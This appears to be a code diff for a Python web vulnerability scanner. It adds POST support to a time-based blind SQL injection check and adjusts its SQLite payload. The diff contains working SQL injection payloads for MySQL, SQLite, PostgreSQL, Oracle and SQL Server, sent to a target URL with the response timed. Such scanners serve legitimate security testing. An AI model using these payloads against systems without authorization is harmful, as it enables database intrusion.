@@ -43,7 +43,7 @@ def scan_sql_error(method, vulns, url, fuzz, cookie, useragent, data):
 
 	# POST
 	if (method == 'POST'): 
-		inject = data
+		inject = dict(data)
 		inject[fuzz] = inject[fuzz] + payload
 		content = requests.post(url, data=inject ,cookies=cookie, headers={'user-agent': useragent} ).text
 
@@ -70,7 +70,7 @@ Parameters: vulns - list of vulnerabilities, url - address of the target, fuzz -
 """
 def scan_sql_blind_time(method, vulns, url, fuzz, cookie, useragent, data):
 	mysql_payload     = "SLEEP(4) /*' || SLEEP(4) || '\" || SLEEP(4) || \"*/"
-	sqlite_payload    = "substr(upper(hex(randomblob(55555555))),0,1) /*' || substr(upper(hex(randomblob(55555555))),0,1) || '\" || substr(upper(hex(randomblob(55555555))),0,1) || \"*/"
+	sqlite_payload    = 'substr(upper(hex(randomblob(55555555))),0,1) /*\' or substr(upper(hex(randomblob(55555555))),0,1) or \'" or substr(upper(hex(randomblob(55555555))),0,1) or "*/'
 	postgre_payload   = "(SELECT 55555555 FROM PG_SLEEP(4)) /*' || (SELECT 55555555 FROM PG_SLEEP(4)) || '\" || (SELECT 55555555 FROM PG_SLEEP(4)) || \"*/"
 	oracle_payload    = "DBMS_PIPE.RECEIVE_MESSAGE(chr(65)||chr(65)||chr(65),5) /*' || DBMS_PIPE.RECEIVE_MESSAGE(chr(65)||chr(65)||chr(65),5) || '\" || DBMS_PIPE.RECEIVE_MESSAGE(chr(65)||chr(65)||chr(65),5) || \"*/"
 	sqlserver_payload = "WAITFOR DELAY chr(48)+chr(58)+chr(48)+chr(58)+chr(52) /*' || WAITFOR DELAY chr(48)+chr(58)+chr(48)+chr(58)+chr(52) || '\" || WAITFOR DELAY chr(48)+chr(58)+chr(48)+chr(58)+chr(52) || \"*/"
@@ -79,15 +79,27 @@ def scan_sql_blind_time(method, vulns, url, fuzz, cookie, useragent, data):
 
 	for payload,name in zip(payloads_list,payloads_name):
 
-		# Do a request and check the response time
-		inject  = url.replace(fuzz+"=", fuzz+"="+payload)
-		time1   = datetime.datetime.now()
-		content = requests.get(inject, cookies=cookie, headers={'user-agent': useragent} ).text
+		# POST
+		if (method == 'POST'):
+			inject = dict(data)
+			inject[fuzz] = payload
+			time1   = datetime.datetime.now()
+			content = requests.post(url, data=inject ,cookies=cookie, headers={'user-agent': useragent} ).text
+			
+			# Change the inject to have a nice display in the plugin
+			inject = url + ":" + fuzz + ":" + inject[fuzz]
+	
+		# GET
+		else:
+			# Do a request and check the response time
+			inject  = url.replace(fuzz+"=", fuzz+"="+payload)
+			time1   = datetime.datetime.now()
+			content = requests.get(inject, cookies=cookie, headers={'user-agent': useragent} ).text
+		
+		# Check - Our payloads will force a delay of 4s at least.
 		time2   = datetime.datetime.now()
 		diff    = time2 - time1
 		diff    = (divmod(diff.days * 86400 + diff.seconds, 60))[1]
-
-		# Our payloads will force a delay of 4s at least.
 		if diff > 2:
 			print "\t\t\033[93mTime Based SQLi (", name ,") Detected \033[0m for ", fuzz, " with the payload :", payload
 			vulns['sql']  += 1
